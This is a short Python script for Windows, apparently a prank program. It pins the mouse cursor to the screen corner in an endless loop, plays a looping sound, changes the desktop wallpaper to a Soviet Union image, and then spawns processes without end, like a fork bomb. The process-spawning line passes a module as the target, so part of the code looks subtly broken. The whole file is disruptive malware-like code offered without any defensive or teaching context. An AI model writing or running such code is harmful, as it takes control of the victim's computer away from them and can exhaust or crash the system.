import win32api
from winsound import *
import multiprocessing
import subprocess
from cpmodules import *
import ctypes
import os
import struct

def loppedMouse():
	while True:
		win32api.SetCursorPos((0,0))

def is_64bit_windows():
	return struct.calcsize('P') * 8 == 64

p = multiprocessing.Process(target=loppedMouse)
p.start()
PlaySound('1.wav', SND_LOOP + SND_ASYNC)

if is_64bit_windows():
	ctypes.windll.user32.SystemParametersInfoW(20, 0, os.path.abspath("sovietunion.jpg"), 0)
else:
	ctypes.windll.user32.SystemParametersInfoA(20, 0, os.path.abspath("sovietunion.jpg"), 0)

if __name__ == "__main__":
	pass
	while True:
		multiprocessing.Process(target=subprocess).start()